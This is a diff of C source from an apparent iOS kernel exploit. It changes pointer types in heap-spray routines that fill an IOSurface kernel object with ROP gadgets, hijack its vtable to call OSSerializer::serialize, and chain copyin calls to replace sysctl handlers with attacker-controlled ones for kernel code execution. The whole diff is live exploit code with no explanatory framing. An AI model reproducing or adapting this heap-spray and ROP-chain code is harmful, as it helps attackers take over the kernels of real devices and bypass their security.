@@ -35,13 +35,13 @@ struct sysctl_oid {
  * Returns:			void.
  */
 
-void heap_spray_prepare_buffer_for_rop(void * function, uint64_t arg0, 
+void heap_spray_prepare_buffer_for_rop(uint64_t function, uint64_t arg0,
 	uint64_t arg1, uint64_t arg2) {
 
 	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION + 0x18) = arg2;
 	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x10) = arg0;
 	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x18) = arg1;
-	*(void**)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x20) = function;
+	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x20) = function;
 }
 
 
@@ -222,44 +222,43 @@ cleanup:
  */
 
 static
-char * heap_spray_get_spraying_buffer(void * object_address) {
+char * heap_spray_get_spraying_buffer(uint64_t object_address) {
 	
 	uint32_t i = 0;
-	kern_return_t ret = KERN_SUCCESS;
 	char * data = malloc(IOSURFACE_KERNEL_OBJECT_SIZE);
 	if (NULL == data)
 	{
 		return data;
 	}
 
-	printf("[INFO]: ret_gadget: %p", offsets_get_kernel_base() + OFFSET(ret_gadget));
+	printf("[INFO]: ret_gadget: %llx", offsets_get_kernel_base() + OFFSET(ret_gadget));
 
 	for(i = 0; i < IOSURFACE_KERNEL_OBJECT_SIZE; i += sizeof(uint64_t)) {
-		*(void**)(data+i) = offsets_get_kernel_base() + OFFSET(ret_gadget);
+		*(uint64_t*)(data+i) = offsets_get_kernel_base() + OFFSET(ret_gadget);
 	}
 
-	*(void**)(data) = object_address;
-	*(uint32_t*)(data + 0x8) = 0x100; 		/* We don't want to be freed. never. */
+	*(uint64_t*)(data) = object_address;
+	*(uint64_t*)(data + 0x8) = 0x100; 		/* We don't want to be freed. never. */
 
 	/* Just for the fun, doesn't really happen in normal flow */
-	*(void**)(data + 0x260) = offsets_get_kernel_base() + OFFSET(panic);
+	*(uint64_t*)(data + 0x260) = offsets_get_kernel_base() + OFFSET(panic);
 
-	*(void**)(data + OFFSET(iosurface_vtable_offset_kernel_hijack)) = 
+	*(uint64_t*)(data + OFFSET(iosurface_vtable_offset_kernel_hijack)) =
 	offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 	
 	//*(void**)(data + 0x98) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);	
 	//*(void**)(data + 0xA0) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 	/* OSSerializer::serialize(data + 0x234, SYSCTL_HANDLER_SIZE * 2) */
-	*(void**)(data + 0x10) = object_address + 0x234;
+	*(uint64_t*)(data + 0x10) = object_address + 0x234;
 	*(unsigned long*)(data + 0x18) = SYSCTL_HANDLER_SIZE * 2; /* third parameter for ROP chain */
-	*(void**)(data + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
+	*(uint64_t*)(data + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 
 	/* copyin(g_fake_sysctl_handlers, l1dcachesize_handler, SYSCTL_HANDLER_SIZE * 2) */
 	*(void**)(data + 0x234 + 0x10) = g_fake_sysctl_handlers; /* first paramter for ROP chain */
-	*(void**)(data + 0x234 + 0x18) = offsets_get_kernel_base() + OFFSET(l1dcachesize_handler); /* second parameter for ROP chain */
-	*(void**)(data + 0x234 + 0x20) = offsets_get_kernel_base() + OFFSET(copyin); 
+	*(uint64_t*)(data + 0x234 + 0x18) = offsets_get_kernel_base() + OFFSET(l1dcachesize_handler); /* second parameter for ROP chain */
+	*(uint64_t*)(data + 0x234 + 0x20) = offsets_get_kernel_base() + OFFSET(copyin);
 
 
 	/* copyin(g_fake_sysctl_handlers, l1dcachesize_handler, SYSCTL_HANDLER_SIZE * 2) */
@@ -267,14 +266,14 @@ char * heap_spray_get_spraying_buffer(void * object_address) {
 
 	/* So we can always modify this object */
 	*(void**)(data + SPRAY_SYSCTL_HELPER + 0x10) = g_new_sprayed_object;
-	*(void**)(data + SPRAY_SYSCTL_HELPER + 0x18) = object_address;
-	*(void**)(data + SPRAY_SYSCTL_HELPER + 0x20) = offsets_get_kernel_base() + OFFSET(copyin);
+	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER + 0x18) = object_address;
+	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER + 0x20) = offsets_get_kernel_base() + OFFSET(copyin);
 
 	/* SPRAY_SYSCTL_HELPER_EXECUTION */
-	*(void**)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x10) = object_address + SPRAY_SYSCTL_HELPER_EXECUTION_ROP; 
+	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x10) = object_address + SPRAY_SYSCTL_HELPER_EXECUTION_ROP;
 	/* arg2 */
 	*(void**)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x18) = (void*)0x1;
-	*(void**)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
+	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 	//memset(data, 0x41414141, IOSURFACE_KERNEL_OBJECT_SIZE);
 
@@ -295,7 +294,7 @@ char * heap_spray_get_spraying_buffer(void * object_address) {
  * Returns:			kern_return_t and the kernel address with our allocated data as an output parameter.
  */
 
-kern_return_t heap_spray_start_spraying(void ** kernel_allocated_data) {
+kern_return_t heap_spray_start_spraying(uint64_t * kernel_allocated_data) {
 	
 	kern_return_t ret = KERN_SUCCESS;
 	char * data_to_spray = NULL;
